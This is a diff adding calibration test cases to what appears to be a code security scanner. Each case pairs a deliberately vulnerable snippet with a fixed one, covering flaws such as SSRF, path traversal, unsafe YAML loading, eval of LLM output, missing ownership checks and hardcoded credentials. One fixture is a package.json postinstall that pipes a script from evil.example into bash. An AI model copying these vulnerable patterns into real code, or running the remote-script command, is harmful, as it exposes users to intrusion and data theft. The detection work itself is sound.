@@ -323,6 +323,174 @@ export const RULE_CASES: RuleCase[] = [
     name: 'pull_request_target with untrusted checkout',
     detects: f('.github/workflows/ci.yml', 'on: pull_request_target\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n      - run: npm ci && npm test\n'),
     ignores: f('.github/workflows/ci.yml', 'on: pull_request\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683\n      - run: npm ci && npm test\n')
+  },
+
+  // ─── Calibration batch 1: previously unproven CRITICAL rules ─────────
+  {
+    ruleIds: [17],
+    name: 'Record fetched by URL id without ownership check (BOLA)',
+    detects: f('app/api/invoices/[id]/route.ts', "import { prisma } from '@/lib/db';\nexport async function GET(req: Request, { params }: { params: { id: string } }) {\n  const invoice = await prisma.invoice.findUnique({ where: { id: params.id } });\n  return Response.json(invoice);\n}\n"),
+    ignores: f('app/api/invoices/[id]/route.ts', "import { prisma } from '@/lib/db';\nimport { auth } from '@/lib/auth';\nexport async function GET(req: Request, { params }: { params: { id: string } }) {\n  const session = await auth();\n  const invoice = await prisma.invoice.findFirst({ where: { id: params.id, ownerId: session.user.id } });\n  return Response.json(invoice);\n}\n")
+  },
+  {
+    ruleIds: [19],
+    name: 'LLM agent with destructive tools and no approval step',
+    detects: f('lib/agent.ts', "export const run = (prompt: string) => generateText({ model, prompt, tools: [searchDocs, deleteDatabase, sendEmail] });\n"),
+    ignores: f('lib/agent.ts', "export const run = (prompt: string) => generateText({ model, prompt, tools: [searchDocs, deleteDatabase, sendEmail], onToolCall: requireApproval });\n")
+  },
+  {
+    ruleIds: [22],
+    name: 'LLM SDK used directly in a client component',
+    detects: f('components/Chat.tsx', "'use client';\nimport OpenAI from 'openai';\nconst client = new OpenAI({ apiKey: process.env.NEXT_PUBLIC_OPENAI_KEY, dangerouslyAllowBrowser: true });\nexport function Chat() { return null; }\n"),
+    ignores: f('components/Chat.tsx', "'use client';\nexport function Chat() {\n  const send = (m: string) => fetch('/api/chat', { method: 'POST', body: m });\n  return <button onClick={() => send('hi')}>Send</button>;\n}\n")
+  },
+  {
+    ruleIds: [24],
+    name: 'File read from a user-controlled path',
+    detects: f('app/api/files/route.ts', "import { readFile } from 'fs/promises';\nexport async function GET(req: Request) {\n  const { searchParams } = new URL(req.url);\n  const data = await readFile(`./uploads/${searchParams.get('name')}`);\n  return new Response(data);\n}\n"),
+    ignores: f('app/api/files/route.ts', "import { readFile } from 'fs/promises';\nimport path from 'path';\nexport async function GET(req: Request) {\n  const { searchParams } = new URL(req.url);\n  const name = path.basename(searchParams.get('name') ?? '');\n  const data = await readFile(path.join('./uploads', name));\n  return new Response(data);\n}\n")
+  },
+  {
+    ruleIds: [31],
+    name: 'YAML loader that instantiates arbitrary objects',
+    detects: f('app/config.py', 'import yaml\n\ndef load(path):\n    with open(path) as f:\n        return yaml.load(f, Loader=yaml.Loader)\n'),
+    ignores: [
+      { path: 'app/config.py', content: 'import yaml\n\ndef load(path):\n    with open(path) as f:\n        return yaml.safe_load(f)\n' },
+      // js-yaml 4: load() uses the safe default schema
+      { path: 'lib/config.ts', content: "import yaml from 'js-yaml';\nexport const parse = (text: string) => yaml.load(text);\n" }
+    ]
+  },
+  {
+    ruleIds: [4003],
+    name: 'LLM output passed to eval',
+    detects: f('lib/agent-run.ts', "export async function run(prompt: string) {\n  const completion = await openai.chat.completions.create({ model: 'gpt-4o', messages: [{ role: 'user', content: prompt }], max_tokens: 500 });\n  return eval(completion.choices[0].message.content ?? '');\n}\n"),
+    ignores: f('lib/agent-run.ts', "export async function run(prompt: string) {\n  const completion = await openai.chat.completions.create({ model: 'gpt-4o', messages: [{ role: 'user', content: prompt }], max_tokens: 500 });\n  return JSON.parse(completion.choices[0].message.content ?? '{}');\n}\n")
+  },
+  {
+    ruleIds: [4004],
+    name: 'Signed-in user search over all tenants\' embeddings',
+    detects: f('app/api/search/route.ts', "import { createClient } from '@/lib/supabase/server';\nexport async function POST(req: Request) {\n  const supabase = await createClient();\n  const { data: { user } } = await supabase.auth.getUser();\n  const { embedding } = await req.json();\n  const { data } = await supabase.rpc('match_documents', { query_embedding: embedding, match_count: 5 });\n  return Response.json(data);\n}\n"),
+    ignores: [
+      { path: 'app/api/search/route.ts', content: "import { createClient } from '@/lib/supabase/server';\nexport async function POST(req: Request) {\n  const supabase = await createClient();\n  const { data: { user } } = await supabase.auth.getUser();\n  const { embedding } = await req.json();\n  const { data } = await supabase.rpc('match_documents', { query_embedding: embedding, match_count: 5, filter_user_id: user.id });\n  return Response.json(data);\n}\n" },
+      { path: 'lib/rag.ts', content: "export async function retrieve(vector: number[], session: Session) {\n  return pc.index('docs').namespace(session.user.id).query({ vector, topK: 5 });\n}\n" },
+      // Public docs search without any user context is not multi-tenant
+      { path: 'app/api/docs-search/route.ts', content: "export async function POST(req: Request) {\n  const { embedding } = await req.json();\n  const { data } = await supabase.rpc('match_documents', { query_embedding: embedding, match_count: 5 });\n  return Response.json(data);\n}\n" }
+    ]
+  },
+  {
+    ruleIds: [4004],
+    name: 'Pinecone query without tenant filter',
+    detects: f('lib/rag.ts', "export async function retrieve(vector: number[], session: Session) {\n  if (!session.user) throw new Error('unauthenticated');\n  const index = pc.index('docs');\n  return index.query({ vector, topK: 5, includeMetadata: true });\n}\n"),
+    ignores: f('lib/rag.ts', "export async function retrieve(vector: number[], session: Session) {\n  const index = pc.index('docs');\n  return index.query({ vector, topK: 5, filter: { userId: session.user.id } });\n}\n")
+  },
+  {
+    ruleIds: [6005],
+    name: 'pg Pool created inside the request handler',
+    detects: f('app/api/users/route.ts', "import { Pool } from 'pg';\nexport async function GET() {\n  const pool = new Pool({ connectionString: process.env.DATABASE_URL });\n  const { rows } = await pool.query('select id from users');\n  return Response.json(rows);\n}\n"),
+    ignores: f('app/api/users/route.ts', "import { Pool } from 'pg';\nconst pool = new Pool({ connectionString: process.env.DATABASE_URL });\nexport async function GET() {\n  const { rows } = await pool.query('select id from users');\n  return Response.json(rows);\n}\n")
+  },
+  {
+    ruleIds: [6009],
+    name: 'External HTTP call inside a database transaction',
+    detects: f('lib/orders.ts', "export async function place(data: OrderInput) {\n  await prisma.$transaction(async (tx) => {\n    await tx.order.create({ data });\n    await fetch('https://api.shipping.example/label', { method: 'POST' });\n  });\n}\n"),
+    ignores: f('lib/orders.ts', "export async function place(data: OrderInput) {\n  await prisma.$transaction(async (tx) => {\n    await tx.order.create({ data });\n  });\n  await fetch('https://api.shipping.example/label', { method: 'POST' });\n}\n")
+  },
+  {
+    ruleIds: [6015],
+    name: 'Pooled pg client never released',
+    detects: f('lib/report.ts', "export async function report() {\n  const client = await pool.connect();\n  const res = await client.query('select count(*) from orders');\n  return res.rows[0];\n}\n"),
+    ignores: f('lib/report.ts', "export async function report() {\n  const client = await pool.connect();\n  try {\n    const res = await client.query('select count(*) from orders');\n    return res.rows[0];\n  } finally {\n    client.release();\n  }\n}\n")
+  },
+  {
+    ruleIds: [6038],
+    name: 'Production database URL with password in source',
+    detects: f('lib/db.ts', 'export const DATABASE_URL = "postgresql://admin:S3cretPass@db.prod.example.com:5432/app";\n'),
+    ignores: f('lib/db.ts', 'export const DATABASE_URL = process.env.DATABASE_URL;\n')
+  },
+  {
+    ruleIds: [7215],
+    name: 'GET handler that deletes data',
+    detects: f('app/api/unsubscribe/route.ts', "export async function GET(req: Request) {\n  const token = new URL(req.url).searchParams.get('token') ?? '';\n  await prisma.subscription.delete({ where: { token } });\n  return new Response('ok');\n}\n"),
+    ignores: f('app/api/unsubscribe/route.ts', "export async function GET(req: Request) {\n  const url = new URL(req.url);\n  url.searchParams.delete('utm_source');\n  const sub = await prisma.subscription.findUnique({ where: { token: url.searchParams.get('token') ?? '' } });\n  return Response.json({ confirm: Boolean(sub) });\n}\nexport async function POST(req: Request) {\n  const { token } = await req.json();\n  await prisma.subscription.delete({ where: { token } });\n  return new Response('ok');\n}\n")
+  },
+  {
+    ruleIds: [7218],
+    name: 'Debug endpoint without authentication',
+    detects: f('app/api/debug/route.ts', 'export async function GET() {\n  return Response.json({ env: process.env.NODE_ENV, memory: process.memoryUsage() });\n}\n'),
+    ignores: f('app/api/debug/route.ts', "export async function GET() {\n  const session = await getServerSession();\n  if (!session) return new Response(null, { status: 401 });\n  return Response.json({ memory: process.memoryUsage() });\n}\n")
+  },
+  {
+    ruleIds: [7242],
+    name: 'WebSocket server without origin check',
+    detects: f('server/ws.ts', "import { WebSocketServer } from 'ws';\nexport const wss = new WebSocketServer({ port: 8080 });\n"),
+    ignores: [
+      { path: 'server/ws.ts', content: "import { WebSocketServer } from 'ws';\nexport const wss = new WebSocketServer({ port: 8080, verifyClient: ({ origin }) => ALLOWED.has(origin) });\n" },
+      { path: 'server/ws2.ts', content: "import { WebSocketServer } from 'ws';\nexport const wss = new WebSocketServer({ port: 8080 });\nwss.on('connection', (ws, req) => { if (!ALLOWED.has(req.headers.origin ?? '')) ws.close(); });\n" }
+    ]
+  },
+  {
+    ruleIds: [7245],
+    name: 'API token generated with Math.random',
+    detects: f('lib/api-keys.ts', 'export function issue() {\n  const token = Math.random().toString(36).slice(2);\n  return token;\n}\n'),
+    ignores: f('lib/api-keys.ts', "import { randomBytes } from 'crypto';\nexport function issue() {\n  const token = randomBytes(32).toString('hex');\n  return token;\n}\n")
+  },
+  {
+    ruleIds: [7302],
+    name: 'postinstall pipes a remote script into a shell',
+    detects: f('package.json', '{\n  "name": "app",\n  "scripts": {\n    "postinstall": "curl -s https://evil.example/x.sh | bash"\n  }\n}\n'),
+    ignores: f('package.json', '{\n  "name": "app",\n  "scripts": {\n    "postinstall": "prisma generate"\n  }\n}\n')
+  },
+  {
+    ruleIds: [7304],
+    name: 'Compromised event-stream / flatmap-stream release',
+    detects: f('package.json', '{\n  "dependencies": {\n    "event-stream": "3.3.6"\n  }\n}\n'),
+    ignores: f('package.json', '{\n  "dependencies": {\n    "event-stream": "^4.0.1"\n  }\n}\n')
+  },
+  {
+    ruleIds: [7307],
+    name: 'npm auth token committed in .npmrc',
+    detects: f('.npmrc', `//registry.npmjs.org/:_authToken=${['npm', 'Zx81QwErTy7UiOpAsDfGhJkLzXcVbNm0123'].join('_')}\n`),
+    ignores: f('.npmrc', '//registry.npmjs.org/:_authToken=${NPM_TOKEN}\n')
+  },
+  {
+    ruleIds: [7317],
+    name: 'Package registry over plain HTTP',
+    detects: f('.npmrc', 'registry=http://registry.npmjs.org/\n'),
+    ignores: f('.npmrc', 'registry=https://registry.npmjs.org/\n')
+  },
+  {
+    ruleIds: [8602],
+    name: 'Service role key passed to a client component',
+    detects: f('components/AdminPanel.tsx', "'use client';\nexport function AdminPanel({ serviceRoleKey }: { serviceRoleKey: string }) {\n  return <div data-k={serviceRoleKey} />;\n}\n"),
+    ignores: f('components/AdminPanel.tsx', "'use client';\nexport function AdminPanel({ users }: { users: string[] }) {\n  return <ul>{users.map((u) => <li key={u}>{u}</li>)}</ul>;\n}\n")
+  },
+  {
+    ruleIds: [9102],
+    name: 'Tenant id kept in module-level state',
+    detects: f('lib/tenant.ts', 'let currentTenant: string | null = null;\nexport function setTenant(id: string) { currentTenant = id; }\nexport const getTenant = () => currentTenant;\n'),
+    ignores: f('lib/tenant.ts', "import { AsyncLocalStorage } from 'node:async_hooks';\nconst store = new AsyncLocalStorage<string>();\nexport const withTenant = <T>(id: string, fn: () => T) => store.run(id, fn);\nexport const getTenant = () => store.getStore();\n")
+  },
+  {
+    ruleIds: [9104],
+    name: 'Storage object key chosen by the client',
+    detects: f('app/api/upload/route.ts', "export async function POST(req: Request) {\n  const body = await req.json();\n  await s3.send(new PutObjectCommand({ Bucket: 'uploads', Key: body.filename, Body: body.data }));\n  return new Response('ok');\n}\n"),
+    ignores: f('app/api/upload/route.ts', "export async function POST(req: Request) {\n  const session = await auth();\n  const body = await req.json();\n  await s3.send(new PutObjectCommand({ Bucket: 'uploads', Key: `${session.user.id}/${randomUUID()}`, Body: body.data }));\n  return new Response('ok');\n}\n")
+  },
+  {
+    ruleIds: [27101],
+    name: 'Server fetches a URL taken from the request body (SSRF)',
+    detects: f('app/api/preview/route.ts', "export async function POST(req: Request) {\n  const session = await auth();\n  const { url } = await req.json();\n  const res = await fetch(url);\n  return new Response(await res.text());\n}\n"),
+    ignores: [
+      { path: 'app/api/preview/route.ts', content: "export async function POST(req: Request) {\n  const session = await auth();\n  const { url } = await req.json();\n  const check = await validateSafeTargetUrl(url);\n  if (!check.safe) return new Response(null, { status: 400 });\n  const res = await fetch(url);\n  return new Response(await res.text());\n}\n" },
+      // URL built from configuration, not from the request
+      { path: 'lib/notify.ts', content: "export async function notify(event: string) {\n  const url = `${process.env.SLACK_WEBHOOK_URL}`;\n  await fetch(url, { method: 'POST', body: JSON.stringify({ text: event }) });\n}\n" }
+    ]
+  },
+  {
+    ruleIds: [100, 101],
+    name: 'Live target down and without CSP',
+    detects: f('live-deployment/security-headers.json', JSON.stringify({ targetUrl: 'https://app.example', statusCode: 503, isHealthy: false, missingSecurityHeaders: ['Content-Security-Policy'], headers: {} })),
+    ignores: f('live-deployment/security-headers.json', JSON.stringify({ targetUrl: 'https://app.example', statusCode: 200, isHealthy: true, missingSecurityHeaders: [], headers: { 'content-security-policy': "default-src 'self'" } }))
   }
 ];
 
